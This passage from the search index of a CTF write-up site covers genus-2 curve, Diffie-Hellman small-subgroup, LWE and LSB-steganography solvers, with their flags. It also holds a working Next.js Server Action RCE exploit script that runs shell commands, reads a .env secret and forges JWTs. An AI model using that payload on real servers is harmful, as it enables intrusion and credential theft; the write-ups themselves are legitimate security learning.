= (X^2, Y)</code></li> <li><code>E2: V^2 = U^3 + a</code> with map <code>(X,Y) -&gt; (U,V) = (X^-2, Y*X^-3)</code></li> </ul> <p>So instead of solving one hard genus-2 DLP directly, I solved two elliptic DLPs.</p>","tags":["crypto","bitsctf"]},{"location":"bits/too-genus-curve/#3-how-i-mapped-mumford-divisors","title":"3. How I Mapped Mumford Divisors","text":"<p>For degree-1 divisor <code>u(x)=x-x0</code>, mapping is direct from the point.</p> <p>For degree-2 divisor <code>u(x)=x^2+u1x+u0</code>, I worked in <code>Fp2 = Fp[r]/(r^2+u1*r+u0)</code>, took one root <code>r</code>, evaluated <code>y=v(r)</code>, mapped the point to <code>E1</code>/<code>E2</code>, then added Frobenius conjugates to trace down to <code>Fp</code>.</p> <p>That gave me points:</p> <ul> <li><code>G1, Q1</code> on <code>E1</code></li> <li><code>G2, Q2</code> on <code>E2</code></li> </ul>","tags":["crypto","bitsctf"]},{"location":"bits/too-genus-curve/#4-solving-the-dlp","title":"4. Solving the DLP","text":"<p>I used Pohlig-Hellman on each elliptic curve subgroup generated by <code>G1</code> and <code>G2</code>.</p> <p>Because the group orders are very smooth, PH runs quickly.</p> <p>I got two congruences:</p> <ul> <li><code>k \u2261 k1 (mod ord(G1))</code></li> <li><code>k \u2261 k2 (mod ord(G2))</code></li> </ul> <p>Then I combined them with CRT (non-coprime-safe) to get:</p> <p><code>k \u2261 k0 (mod period)</code></p>","tags":["crypto","bitsctf"]},{"location":"bits/too-genus-curve/#5-recovering-exact-secret-and-decrypting","title":"5. Recovering Exact Secret and Decrypting","text":"<p>The encryption key was derived from decimal-string secret hashing:</p> <p><code>keystream = sha256(str(secret).encode()).digest()</code></p> <p>and ciphertext was XOR with repeating keystream.</p> <p>So I tested representatives <code>k0 + i*period</code> and checked for <code>BITSCTF{...}</code> format.</p> <p>This produced:</p> <p><code>BITSCTF{7h15_15_w4y_2_63nu5_6n6}</code></p>","tags":["crypto","bitsctf"]},{"location":"bits/too-genus-curve/#full-solver-code","title":"Full Solver Code","text":"<pre><code>#!/usr/bin/env python3\nfrom hashlib import sha256\nfrom math import comb, gcd\nimport sympy as sp\n\np = 129403459552990578380563458675806698255602319995627987262273876063027199999999\nf_coeffs = [\n    87455262955769204408909693706467098277950190590892613056321965035180446006909,\n    12974562908961912291194866717212639606874236186841895510497190838007409517645,\n    11783716142539985302405554361639449205645147839326353007313482278494373873961,\n    55538572054380843320095276970494894739360361643073391911629387500799664701622,\n    124693689608554093001160935345506274464356592648782752624438608741195842443294,\n    52421364818382902628746436339763596377408277031987489475057857088827865195813,\n    50724784947260982182351215897978953782056750224573008740629192419901238915128,\n]\nG_u = [95640493847532285274015733349271558012724241405617918614689663966283911276425, 1]\nG_v = [23400917335266251424562394829509514520732985938931801439527671091919836508525]\nQ_u = [\n    34277069903919260496311859860543966319397387795368332332841962946806971944007,\n    343503204040841221074922908076232301549085995886639625441980830955087919004,\n    1,\n]\nQ_v = [\n    102912018107558878490777762211244852581725648344091143891953689351031146217393,\n    65726604025436600725921245450121844689064814125373504369631968173219177046384,\n]\nenc_flag = bytes.fromhex(\"f6ca1f88bdb8e8dda17861b91704523f914564888c7138c24a3ab98902c10de5\")\n\n\ndef shift_poly(coeffs, t, mod):\n    n = len(coeffs) - 1\n    out = [0] * (n + 1)\n    for i, a in enumerate(coeffs):\n        pows = [1]\n        for _ in range(i):\n            pows.append((pows[-1] * t) % mod)\n        for j in range(i + 1):\n            out[j] = (out[j] + a * comb(i, j) * pows[i - j]) % mod\n    return out\n\n\nclass Fp2:\n    __slots__ = (\"a\", \"b\", \"u0\", \"u1\", \"p\")\n\n    def __init__(self, a, b, u0, u1, p):\n        self.a = a % p\n        self.b = b % p\n        self.u0 = u0 % p\n        self.u1 = u1 % p\n        self.p = p\n\n    def __add__(self, other):\n        return Fp2(self.a + other.a, self.b + other.b, self.u0, self.u1, self.p)\n\n    def __sub__(self, other):\n        return Fp2(self.a - other.a, self.b - other.b, self.u0, self.u1, self.p)\n\n    def __neg__(self):\n        return Fp2(-self.a, -self.b, self.u0, self.u1, self.p)\n\n    def __mul__(self, other):\n        # alpha^2 = -u1*alpha - u0\n        a = (self.a * other.a - self.b * other.b * self.u0) % self.p\n        b = (self.a * other.b + self.b * other.a - self.b * other.b * self.u1) % self.p\n        return Fp2(a, b, self.u0, self.u1, self.p)\n\n    def __eq__(self, other):\n        return self.a == other.a and self.b == other.b\n\n    def conj(self):\n        return Fp2(self.a - self.b * self.u1, -self.b, self.u0, self.u1, self.p)\n\n    def norm(self):\n        return (self.a * self.a - self.a * self.b * self.u1 + self.b * self.b * self.u0) % self.p\n\n    def inv(self):\n        n = self.norm()\n        if n == 0:\n            raise ZeroDivisionError(\"non-invertible in Fp2\")\n        ni = pow(n, -1, self.p)\n        c = self.conj()\n        return Fp2(c.a * ni, c.b * ni, self.u0, self.u1, self.p)\n\n    def __truediv__(self, other):\n        return self * other.inv()\n\n    def pow(self, e):\n        r = Fp2(1, 0, self.u0, self.u1, self.p)\n        b = self\n        while e &gt; 0:\n            if e &amp; 1:\n                r = r * b\n            e &gt;&gt;= 1\n            if e:\n                b = b * b\n        return r\n\n    def is_base(self):\n        return self.b == 0\n\n\ndef ec_add_fp(P, Q, c3, mod):\n    if P is None:\n        return Q\n    if Q is None:\n        return P\n    x1, y1 = P\n    x2, y2 = Q\n    if x1 == x2 and (y1 + y2) % mod == 0:\n        return None\n    if x1 == x2 and y1 == y2:\n        if y1 == 0:\n            return None\n        m = (3 * c3 * x1 * x1) % mod\n        m = (m * pow((2 * y1) % mod, -1, mod)) % mod\n    else:\n        m = ((y2 - y1) % mod) * pow((x2 - x1) % mod, -1, mod) % mod\n    x3 = (m * m) % mod\n    x3 = (x3 * pow(c3, -1, mod)) % mod\n    x3 = (x3 - x1 - x2) % mod\n    y3 = (-(m * (x3 - x1) + y1)) % mod\n    return (x3, y3)\n\n\ndef ec_add_fp2(P, Q, c3, mod):\n    if P is None:\n        return Q\n    if Q is None:\n        return P\n    x1, y1 = P\n    x2, y2 = Q\n    if x1 == x2 and (y1 + y2) == Fp2(0, 0, x1.u0, x1.u1, mod):\n        return None\n    if x1 == x2 and y1 == y2:\n        if y1 == Fp2(0, 0, x1.u0, x1.u1, mod):\n            return None\n        m = (x1 * x1) * Fp2(3 * c3, 0, x1.u0, x1.u1, mod)\n        m = m / (y1 * Fp2(2, 0, x1.u0, x1.u1, mod))\n    else:\n        m = (y2 - y1) / (x2 - x1)\n    x3 = (m * m) / Fp2(c3, 0, x1.u0, x1.u1, mod)\n    x3 = x3 - x1 - x2\n    y3 = -(m * (x3 - x1) + y1)\n    return (x3, y3)\n\n\ndef ec_mul(P, n, c3, mod, ext=False):\n    R = None\n    Q = P\n    add = ec_add_fp2 if ext else ec_add_fp\n    while n &gt; 0:\n        if n &amp; 1:\n            R = add(R, Q, c3, mod)\n        n &gt;&gt;= 1\n        if n:\n            Q = add(Q, Q, c3, mod)\n    return R\n\n\ndef ec_neg(P, mod):\n    if P is None:\n        return None\n    x, y = P\n    if isinstance(y, Fp2):\n        return (x, -y)\n    return (x, (-y) % mod)\n\n\ndef ec_sub(P, Q, c3, mod):\n    return ec_add_fp(P, ec_neg(Q, mod), c3, mod)\n\n\ndef map_divisor_to_elliptic(u, v, t, a, mod):\n    du = len(u) - 1\n    if du == 0:\n        return None, None\n    if du == 1:\n        x = (-u[0]) % mod\n        y = v[0] % mod\n        X = (x - t) % mod\n        U1 = (X * X) % mod\n        V1 = y\n        invX = pow(X, -1, mod)\n        U2 = (invX * invX) % mod\n        V2 = (y * pow(invX, 3, mod)) % mod\n        return (U1, V1), (U2, V2)\n    if du == 2:\n        u0 = u[0] % mod\n        u1 = u[1] % mod\n        r = Fp2(0, 1, u0, u1, mod)\n        y = Fp2(v[0], 0, u0, u1, mod)\n        if len(v) &gt; 1:\n            y = y + (r * Fp2(v[1], 0, u0, u1, mod))\n        X = r - Fp2(t, 0, u0, u1, mod)\n\n        # E1: y^2 = a*u^3 + 1\n        P1 = (X * X, y)\n        P1b = (P1[0].conj(), P1[1].conj())\n        S1 = ec_add_fp2(P1, P1b, a, mod)\n\n        # E2: y^2 = u^3 + a\n        invX = X.inv()\n        P2 = (invX * invX, y * invX.pow(3))\n        P2b = (P2[0].conj(), P2[1].conj())\n        S2 = ec_add_fp2(P2, P2b, 1, mod)\n\n        out = []\n        for S in (S1, S2):\n            if S is None:\n                out.append(None)\n                continue\n            sx, sy = S\n            if not sx.is_base() or not sy.is_base():\n                raise ValueError(\"trace point did not land in Fp\")\n            out.append((sx.a % mod, sy.a % mod))\n        return tuple(out)\n    raise ValueError(\"unexpected divisor degree\")\n\n\ndef point_order(P, c3, mod, group_order, factors):\n    o = group_order\n    for prime, exp in factors.items():\n        for _ in range(exp):\n            cand = o // prime\n            if ec_mul(P, cand, c3, mod) is None:\n                o = cand\n            else:\n                break\n    return o\n\n\ndef dlog_prime_power(P, Q, prime, exp, c3, mod):\n    # assumes ord(P) = prime**exp\n    x = 0\n    P0 = ec_mul(P, prime ** (exp - 1), c3, mod)\n    for j in range(exp):\n        R = ec_sub(Q, ec_mul(P, x, c3, mod), c3, mod)\n        Rj = ec_mul(R, prime ** (exp - 1 - j), c3, mod)\n        digit = None\n        cur = None\n        for k in range(prime):\n            if k == 0:\n                cur = None\n            elif k == 1:\n                cur = P0\n            else:\n                cur = ec_add_fp(cur, P0, c3, mod)\n            if cur == Rj:\n                digit = k\n                break\n        if digit is None:\n            raise ValueError(f\"no digit for prime={prime}, j={j}\")\n        x += digit * (prime ** j)\n    return x\n\n\ndef dlog_pohlig_hellman(P, Q, ordP, c3, mod):\n    fac = sp.factorint(ordP)\n    residues = []\n    moduli = []\n    for prime, exp in fac.items():\n        pe = prime ** exp\n        cofactor = ordP // pe\n        Pi = ec_mul(P, cofactor, c3, mod)\n        Qi = ec_mul(Q, cofactor, c3, mod)\n        xi = dlog_prime_power(Pi, Qi, prime, exp, c3, mod)\n        residues.append(xi)\n        moduli.append(pe)\n    x = sp.ntheory.modular.crt(moduli, residues)[0]\n    return int(x) % ordP\n\n\ndef combine_congruence(a1, m1, a2, m2):\n    g = gcd(m1, m2)\n    if (a1 - a2) % g != 0:\n        raise ValueError(\"inconsistent congruences\")\n    l = m1 // g * m2\n    t = ((a2 - a1) // g) * pow((m1 // g) % (m2 // g), -1, m2 // g)\n    t %= (m2 // g)\n    x = (a1 + m1 * t) % l\n    return x, l\n\n\ndef decrypt_with_secret(ciphertext, secret):\n    ks = sha256(str(secret).encode()).digest()\n    return bytes(c ^ ks[i % len(ks)] for i, c in enumerate(ciphertext))\n\n\ndef main():\n    # 1) Shift x -&gt; X+t to get an even sextic\n    f6 = f_coeffs[6]\n    f5 = f_coeffs[5]\n    t = (-f5 * pow((6 * f6) % p, -1, p)) % p\n    shifted = shift_poly(f_coeffs, t, p)\n\n    print(\"[+] shift t =\", t)\n    print(\"[+] shifted odd coefficients (x, x^3, x^5):\", shifted[1], shifted[3], shifted[5])\n\n    if shifted[1] != 0 or shifted[3] != 0 or shifted[5] != 0:\n        raise SystemExit(\"shift failed to produce even polynomial\")\n\n    a = shifted[6]\n    if shifted[:6] != [1, 0, 0, 0, 0, 0]:\n        raise SystemExit(\"unexpected shifted form\")\n\n    print(\"[+] C' : y^2 = 1 + a*X^6\")\n    print(\"[+] a =\", a)\n\n    # 2) Map Jacobian divisors into E1 x E2\n    G1, G2 = map_divisor_to_elliptic(G_u, G_v, t, a, p)\n    Q1, Q2 = map_divisor_to_elliptic(Q_u, Q_v, t, a, p)\n\n    print(\"[+] G1 =\", G1)\n    print(\"[+] Q1 =\", Q1)\n    print(\"[+] G2 =\", G2)\n    print(\"[+] Q2 =\", Q2)\n\n    # 3) Solve two elliptic DLPs\n    N = p + 1\n    facN = sp.factorint(N)\n\n    ordG1 = point_order(G1, a, p, N, facN)\n    ordG2 = point_order(G2, 1, p, N, facN)\n    print(\"[+] ord(G1) =\", ordG1)\n    print(\"[+] ord(G2) =\", ordG2)\n\n    k1 = dlog_pohlig_hellman(G1, Q1, ordG1, a, p)\n    k2 = dlog_pohlig_hellman(G2, Q2, ordG2, 1, p)\n    print(\"[+] k1 =\", k1)\n    print(\"[+] k2 =\", k2)\n\n    if ec_mul(G1, k1, a, p) != Q1:\n        raise SystemExit(\"k1 check failed\")\n    if ec_mul(G2, k2, 1, p) != Q2:\n        raise SystemExit(\"k2 check failed\")\n\n    k0, period = combine_congruence(k1, ordG1, k2, ordG2)\n    print(\"[+] k \u2261\", k0, \"(mod\", period, \")\")\n\n    # 4) Recover the exact representative used by encryption\n    for i in range(0, 16):\n        candidate = k0 + i * period\n        pt = decrypt_with_secret(enc_flag, candidate)\n        if pt.startswith(b\"BITSCTF{\") and pt.endswith(b\"}\"):\n            print(\"[+] secret used =\", candidate)\n            print(\"[+] flag =\", pt.decode())\n            return\n\n    raise SystemExit(\"flag not found in searched representatives\")\n\n\nif __name__ == \"__main__\":\n    main()\n</code></pre>","tags":["crypto","bitsctf"]},{"location":"bits/too-genus-curve/#output-i-got","title":"Output I Got","text":"<p>When I ran the script, it printed:</p> <ul> <li><code>secret used = 91527621348541142496688581834442276703691715094599257862319082414424378704170</code></li> <li><code>flag = BITSCTF{7h15_15_w4y_2_63nu5_6n6}</code></li> </ul>","tags":["crypto","bitsctf"]},{"location":"hackday2026/","title":"Trust me I'm authenticated \u2014 HackDay 2026","text":"<p>Category: Web</p>","tags":["web","hackday2026"]},{"location":"hackday2026/#background","title":"Background","text":"<ul> <li>Target: <code>https://fhjhtr10n9.hackday.fr</code></li> <li><code>/flag</code> gated by HTTP 401, <code>/terminal</code> hosted a Next.js \u201clegacy terminal\u201d and nginx/proxying a Go API that returned 404 on port 80.</li> <li>Source comment \u201cLast update: 2002\u201d hinted at older auth mechanisms.</li> </ul>","tags":["web","hackday2026"]},{"location":"hackday2026/#recon-and-early-dead-ends","title":"Recon and early dead ends","text":"<ul> <li><code>/flag</code> reliably 401\u2019ed even after trying header-based bypasses (<code>X-Forwarded-For</code>, <code>X-Real-IP</code>, <code>X-Client-IP</code>, <code>X-Original-URL</code>) and brute-forcing Basic Auth with <code>admin:2002</code>.</li> <li><code>/terminal</code> rendered a fake shell; inspecting the bundle reminded me of CVE-2024-34351 (Next.js Server Actions SSRF). A publicly available scanner flagged the app as vulnerable, but the \u201csafe-check\u201d SSRF payload never reached my redirect server and kept throwing 500s.</li> </ul>","tags":["web","hackday2026"]},{"location":"hackday2026/#cve-2024-34351-rce","title":"CVE-2024-34351 RCE","text":"<ul> <li> <p>Re-running the scanner without the safe-check triggered the RCE test payload. The server responded <code>303</code> with <code>X-Action-Redirect: /login?a=11111;push</code>, proving arbitrary server-side code execution through the Next.js Server Action.</p> </li> <li> <p>Crafted a custom Python exploit that mimicked the scanner\u2019s payload structure by abusing the promise hooks in the form submission. The key part was building <code>process.mainModule.require('child_process').execSync</code> and surfacing the result through a <code>NEXT_REDIRECT</code> error to force it into the <code>X-Action-Redirect</code> header.</p> </li> </ul> <pre><code>import requests, sys, urllib3\nurllib3.disable_warnings()\n\ncmd = sys.argv[1] if len(sys.argv) &gt; 1 else \"echo $((41*271))\"\nurl = \"https://fhjhtr10n9.hackday.fr/terminal\"\nboundary = \"----WebKitFormBoundaryx8jO2oVc6SWP3Sad\"\n\nprefix_payload = (\n    f\"var res=process.mainModule.require('child_process').execSync('{cmd}')\"\n    f\".toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),\"\n    f\"{{digest: `NEXT_REDIRECT;push;/login?a=${{res}};307;`}});\"\n)\n\npart0 = (\n    '{\"then\":\"$1:__proto__:then\",\"status\":\"resolved_model\",\"reason\":-1,'\n    '\"value\":\"{\\\\\"then\\\\\":\\\\\"$B1337\\\\\"}\",\"_response\":{\"_prefix\":\"'\n    + prefix_payload\n    + '\",\"_chunks\":\"$Q2\",\"_formData\":{\"get\":\"$1:constructor:constructor\"}}}'\n)\n\npayload = (\n    f\"------{boundary}\\r\\n\"\n    f'Content-Disposition: form-data; name=\"0\"\\r\\n\\r\\n'\n    f\"{part0}\\r\\n\"\n    f\"------{boundary}\\r\\n\"\n    f'Content-Disposition: form-data; name=\"1\"\\r\\n\\r\\n'\n    f'\"$@0\"\\r\\n'\n    f\"------{boundary}\\r\\n\"\n    f'Content-Disposition: form-data; name=\"2\"\\r\\n\\r\\n'\n    f\"[]\\r\\n\"\n    f\"------{boundary}--\"\n)\n\nheaders = {\"Next-Action\": \"x\", \"Content-Type\": f\"multipart/form-data; boundary={boundary}\"}\nresp = requests.post(url, headers=headers, data=payload.encode(), verify=False, allow_redirects=False)\nprint(resp.status_code, resp.headers.get(\"X-Action-Redirect\"))\n</code></pre> <ul> <li>Running the script with simple commands confirmed RCE as the <code>app</code> user inside <code>/app</code>:</li> <li><code>python test_rce.py \"whoami\"</code> \u2192 <code>X-Action-Redirect: /login?a=app;push</code></li> <li><code>python test_rce.py \"pwd\"</code> \u2192 <code>/login?a=/app;push</code></li> <li><code>python test_rce.py \"id\"</code> \u2192 <code>/login?a=uid=100(app) gid=101(app) groups=101(app);push</code></li> </ul>","tags":["web","hackday2026"]},{"location":"hackday2026/#taming-output-noise","title":"Taming output noise","text":"<ul> <li>Multi-line output (e.g., <code>ls -la</code>) caused the redirect header to break and return 500/502. Wrapping commands in <code>echo $(...)</code> collapsed whitespace and made the header friendly again:</li> <li><code>python test_rce.py 'echo $(ls)'</code> \u2192 redirected with the root <code>/app</code> listing.</li> <li><code>python test_rce.py 'echo $(ls /)'</code> \u2192 returned the top-level directories.</li> </ul>","tags":["web","hackday2026"]},{"location":"hackday2026/#finding-secrets","title":"Finding secrets","text":"<ul> <li>Enumerating <code>/app</code> using the echo trick revealed <code>.env.development</code>. Reading it via <code>echo $(cat .env.development)</code> exposed:</li> </ul> <pre><code>JWT_SECRET_KEY=eZgZQxUmZr9A8HZFPLVjXKh3tWnZBWtF9GAtgmqLdNc=\n</code></pre>","tags":["web","hackday2026"]},{"location":"hackday2026/#forging-authentication","title":"Forging authentication","text":"<ul> <li>The challenge name (\u201cTrust me I\u2019m authenticated\u201d) and the secret implied JWT-based gating. Using <code>pyjwt</code> with the leaked key, I minted tokens with different payloads. The server only verified the signature, so even <code>{}</code> worked:</li> </ul> <pre><code>import jwt, requests, urllib3\nurllib3.disable_warnings()\n\nsecret = \"eZgZQxUmZr9A8HZFPLVjXKh3tWnZBWtF9GAtgmqLdNc=\"\ntoken = jwt.encode({}, secret, algorithm=\"HS256\")\nresp = requests.get(\"https://fhjhtr10n9.hackday.fr/flag\", headers={\"Authorization\": f\"Bearer {token}\"}, verify=False)\nprint(resp.status_code)\nprint(resp.text.splitlines()[1])\n</code></pre> <ul> <li>Requesting <code>/flag</code> with the forged bearer token returned the flag page in plain HTML.</li> </ul>","tags":["web","hackday2026"]},{"location":"hackday2026/#flag","title":"Flag","text":"<ul> <li><code>HACKDAY{220d51b50ba176090af032df28c309547db1f2a445eb2a0740746b61356e683f}</code></li> </ul>","tags":["web","hackday2026"]},{"location":"hackday2026/crypto/","title":"As Small As Possible (DH + AES-GCM)","text":"<p>Category: Crypto</p>","tags":["crypto","hackday2026"]},{"location":"hackday2026/crypto/#tldr","title":"TL;DR","text":"<ul> <li>The server accepts arbitrary Diffie\u2013Hellman public keys without subgroup checks, so I could force Alice\u2019s shared secret into tiny factors of <code>p-1</code>.</li> <li>Recovering Alice\u2019s exponent modulo each small prime and recombining with CRT let me derive the real shared secret and decrypt the intercepted AES-GCM traffic.</li> </ul>","tags":["crypto","hackday2026"]},{"location":"hackday2026/crypto/#1-recon-what-the-service-does","title":"1) Recon: what the service does","text":"<ul> <li>When I connected to the challenge I saw an intercepted AES-GCM payload (<code>iv</code>, <code>ciphertext</code>, <code>tag</code>) and a menu to interact with Alice or Bob.</li> <li>Selecting Alice printed Alice\u2019s DH public key and the modulus <code>p</code>, then prompted for my DH public key. Alice computes <code>s = Y^a mod p</code>, derives an AES key from <code>s</code>, and returns a JSON AES-GCM message using that key.</li> </ul>","tags":["crypto","hackday2026"]},{"location":"hackday2026/crypto/#2-key-derivation-discovery-using-the-1-trick","title":"2) Key derivation discovery (using the \u201c1 trick\u201d)","text":"<ul> <li>Sending <code>Your Key = 1</code> forced the shared secret to 1 since <code>1^a == 1 mod p</code>.</li> <li>Alice encrypts a \u201cwelcome banner\u201d that I recognized as known plaintext after trying different KDF guesses.</li> <li>The working KDF was <code>AESkey = SHA256(str(shared_secret).encode())</code>, i.e., <code>sha256(str(s).encode()).digest()</code>.</li> </ul>","tags":["crypto","hackday2026"]},{"location":"hackday2026/crypto/#3-the-real-vulnerability-no-subgroup-validation","title":"3) The real vulnerability: no subgroup validation","text":"<ul> <li>Because the server never checks subgroup membership, any element whose order divides <code>p-1</code> is accepted. In <code>Z_p^*</code>, orders are factors of <code>p-1</code>.</li> <li>Sending an element of a small order <code>q | (p-1)</code> confines the shared secret <code>s = h^a</code> to at most <code>q</code> values, so I could brute-force <code>a mod q</code> using the known plaintext and AES-GCM tag verification.</li> </ul>","tags":["crypto","hackday2026"]},{"location":"hackday2026/crypto/#4-how-to-get-an-element-of-order-q","title":"4) How to get an element of order <code>q</code>","text":"<p>For each small prime factor <code>q</code> of <code>p-1</code>, I did: 1. Choose random <code>r</code> in <code>[2, p-2)</code>. 2. Compute <code>h = r^((p-1)/q) mod p</code>. 3. If <code>h != 1</code>, it has order <code>q</code> with overwhelming probability. I used that as my public key to communicate with Alice.</p>","tags":["crypto","hackday2026"]},{"location":"hackday2026/crypto/#5-recover-a-mod-q-using-alice-tag-verification","title":"5) Recover <code>a mod q</code> using Alice + tag verification","text":"<ol> <li>I sent Alice <code>Your Key = h</code> (order <code>q</code>) and collected <code>(iv, ciphertext, tag)</code>.</li> <li>For each candidate <code>e in [0, q-1]</code>, I computed <code>s_e = h^e mod p</code>, derived <code>key = sha256(str(s_e).encode()).digest()</code>, and attempted AES-GCM decrypt with the known welcome banner.</li> <li>The unique <code>e</code> that decrypted correctly (and verified the tag) gave <code>a \u2261 e mod q</code>.</li> </ol>","tags":["crypto","hackday2026"]},{"location":"hackday2026/crypto/#6-reconstruct-alices-private-exponent-with-crt","title":"6) Reconstruct Alice\u2019s private exponent with CRT","text":"<ol> <li>I factored <code>p-1 = \u220f q_i</code> into its prime factors (all quite small since <code>p-1</code> is smooth).</li> <li>I repeated the above step for each <code>q_i</code>, collecting congruences <code>a \u2261 e_i mod q_i</code>.</li> <li>I applied the Chinese Remainder Theorem to reconstruct <code>a mod (p-1)</code>.</li> </ol>","tags":["crypto","hackday2026"]},{"location":"hackday2026/crypto/#7-decrypt-the-intercepted-traffic-get-the-flag","title":"7) Decrypt the intercepted traffic (get the flag)","text":"<ol> <li>I computed the real shared secret with Bob\u2019s public key: <code>s = (BobPub)^a mod p</code>.</li> <li>I derived the AES key using the discovered KDF (<code>sha256(str(s).encode()).digest()</code>).</li> <li>I decrypted the intercepted AES-GCM payload and extracted <code>HACKDAY{...}</code>.</li> </ol>","tags":["crypto","hackday2026"]},{"location":"hackday2026/crypto/#8-why-the-challenge-name-fits","title":"8) Why the challenge name fits","text":"<ul> <li>\u201cAs small as possible\u201d hints that the private secret can be forced into tiny subgroups, making brute-force over those small sets practical and enabling full exponent recovery.</li> </ul>","tags":["crypto","hackday2026"]},{"location":"hackday2026/matrix/","title":"Matrix Challenge \u2014 Steganography","text":"<p>Category: Misc / Steganography</p>","tags":["misc","stego","hackday2026"]},{"location":"hackday2026/matrix/#challenge-summary","title":"Challenge summary","text":"<ul> <li>Image: The Matrix \u201cbullet time\u201d scene with a cyan waveform overlay and a SHA1 of <code>4bbab076a0aa488761cd216a82bf4e508a2953ab</code> to verify the file.</li> <li>Hints referenced the \u201cred pill,\u201d \u201cred signals,\u201d LSBs, regrouping bits into bytes, and the Answer to the Ultimate Question (42).</li> <li>My key observation was to focus on the red channel\u2019s least significant bits, rebuild bytes, then XOR with <code>0x42</code> to undo the distortion.</li> </ul>","tags":["misc","stego","hackday2026"]},{"location":"hackday2026/matrix/#solution-outline","title":"Solution outline","text":"<ol> <li>I extracted the red channel from the PNG and kept only the least significant bit of every pixel (LSB steganography).</li> <li>I flattened the LSB bitstream and grouped it into bytes (8 bits, MSB first) to reconstruct the hidden data.</li> <li>I XORed every byte with <code>0x42</code> (the hexadecimal representation of \u201c42\u201d from Hitchhiker\u2019s Guide) to remove the obfuscation.</li> <li>I searched the result for <code>HACKDAY{...}</code> and printed the flag.</li> </ol>","tags":["misc","stego","hackday2026"]},{"location":"hackday2026/matrix/#key-implementation","title":"Key implementation","text":"<pre><code>from PIL import Image\nimport numpy as np\n\nimg = Image.open('Matrix_challenge.png')\nred = np.array(img)[:, :, 0]\nflat_lsb = (red &amp; 1).flatten()\n\nbytes_out = []\nfor i in range(0, len(flat_lsb) - 8, 8):\n    byte = 0\n    for bit in range(8):\n        byte = (byte &lt;&lt; 1) | flat_lsb[i + bit]\n    bytes_out.append(byte)\n\ndecoded = bytes(b ^ 0x42 for b in bytes_out)\nflag_start = decoded.find(b'HACKDAY{')\nflag_end = decoded.find(b'}', flag_start)\nprint(decoded[flag_start:flag_end + 1].decode())\n</code></pre>","tags":["misc","stego","hackday2026"]},{"location":"hackday2026/matrix/#result","title":"Result","text":"<ul> <li>Flag: <code>HACKDAY{e3a12b9383038b0c6d755bcb39d3bf879cac3750588226ba1c52d64fde0a7c96}</code></li> </ul>","tags":["misc","stego","hackday2026"]},{"location":"hackena/","title":"Hackena CTF","text":"<p>These are the Hackena writeups I worked through.</p>"},{"location":"hackena/lwe-lattice/","title":"Hackena CTF - LWE Lattice Challenge Writeup","text":"<p>Category: Crypto</p>","tags":["crypto","hackena"]},{"location":"hackena/lwe-lattice/#challenge-overview","title":"Challenge Overview","text":"<p>I was given a Python script (<code>chall.py</code>) that implements a lattice-based cryptographic scheme and an output file containing the public parameters and encrypted flag.</p>","tags":["crypto","hackena"]},{"location":"hackena/lwe-lattice/#analysis","title":"Analysis","text":"","tags":["crypto","hackena"]},{"location":"hackena/lwe-lattice/#understanding-the-scheme","title":"Understanding the Scheme","text":"<p>The challenge constructs the following:</p> <ol> <li>Secret generation: A small vector <code>z \u2208 {-1, 0, 1}^n</code> is generated</li> <li> <p>Lattice basis <code>Bs</code>: A special structured matrix of the form:    <pre><code>Bs = [ q\u00b7I_k  |    0    ]\n     [   X    | I_{n-k} ]\n</code></pre>    where <code>k = 12</code>, <code>n = 40</code>, and <code>q = 12289</code></p> </li> <li> <p>Secret <code>s</code>: Computed as <code>s = z \u00b7 Bs (mod q)</code></p> </li> <li>LWE instance: <code>b = s\u00b7A + e (mod q)</code> where <code>e \u2208 {-1, 0, 1}^m</code> is small error</li> <li>Encryption: The flag is XOR'd with <code>SHA256(s)</code></li> </ol>","tags":["crypto","hackena"]},{"location":"hackena/lwe-lattice/#key-parameters","title":"Key Parameters","text":"<ul> <li><code>q = 12289</code> (prime modulus)</li> <li><code>n = 40</code> (secret dimension)</li> <li><code>k = 12</code> (identity block size)</li> <li><code>m = 60</code> (LWE sample dimension)</li> </ul>","tags":["crypto","hackena"]},{"location":"hackena/lwe-lattice/#solution-strategy","title":"Solution Strategy","text":"<p>The goal is to recover <code>s</code> to derive the decryption key. Since <code>s = z\u00b7Bs</code> where <code>z</code> is small, this is a bounded distance decoding (BDD) problem that can be solved using lattice reduction.</p>","tags":["crypto","hackena"]},{"location":"hackena/lwe-lattice/#kannans-embedding-technique","title":"Kannan's Embedding Technique","text":"<p>I constructed a lattice that encodes both constraints: 1. <code>s = z\u00b7Bs</code> (s lies in the Bs lattice) 2. <code>b = s\u00b7A + e</code> (LWE relation with small error)</p> <p>Substituting, I got: <code>z\u00b7(Bs\u00b7A) + e \u2261 b (mod q)</code></p> <p>I built the embedding lattice:</p> <pre><code>L = [ q\u00b7I_m   |    0    |  0 ]\n    [ (Bs\u00b7A)\u1d40 |  c\u00b7I_n  |  0 ]\n    [    b    |    0    |  W ]\n</code></pre> <p>Where: - <code>c</code> is a scaling factor for the <code>z</code> components - <code>W</code> is the embedding weight to identify the target vector</p> <p>A short vector in this lattice corresponds to <code>(e, c\u00b7z, W)</code> where both <code>e</code> and <code>z</code> are small.</p>","tags":["crypto","hackena"]},{"location":"hackena/lwe-lattice/#implementation","title":"Implementation","text":"<pre><code>import json\nimport hashlib\nfrom fpylll import IntegerMatrix, BKZ\n\n# Load data\nwith open(\"output.txt\", \"r\") as f:\n    data = json.load(f)\n\nq, A, b, Bs = data[\"q\"], data[\"A\"], data[\"b\"], data[\"Bs\"]\nenc_flag = bytes.fromhex(data[\"enc_flag_hex\"])\nn, m = len(Bs), len(A[0])\n\n# Compute Bs * A (mod q)\nBsA = [[sum(Bs[i][k] * A[k][j] for k in range(n)) % q \n        for j in range(m)] for i in range(n)]\n\n# Build embedding lattice\nW, Z_scale = 100, 10\ndim = m + n + 1\nL = IntegerMatrix(dim, dim)\n\n# Fill lattice blocks\nfor i in range(m):\n    L[i, i] = q\nfor j in range(n):\n    for i in range(m):\n        L[m + j, i] = BsA[j][i]\n    L[m + j, m + j] = Z_scale\nfor i in range(m):\n    L[m + n, i] = b[i]\nL[m + n, m + n] = W\n\n# Run BKZ reduction\nBKZ.reduction(L, BKZ.Param(30))\n\n# Search for solution\nfor i in range(dim):\n    row = [L[i, j] for j in range(dim)]\n    if abs(row[-1]) != W:\n        continue\n\n    sign = 1 if row[-1] == W else -1\n    z = [sign * row[m + j] // Z_scale for j in range(n)]\n\n    if max(abs(x) for x in z) &gt; 1:\n        continue\n\n    # Try both z and -z\n    for z_try in [z, [-x for x in z]]:\n        s = [sum(z_try[j] * Bs[j][i] for j in range(n)) % q for i in range(n)]\n        sA = 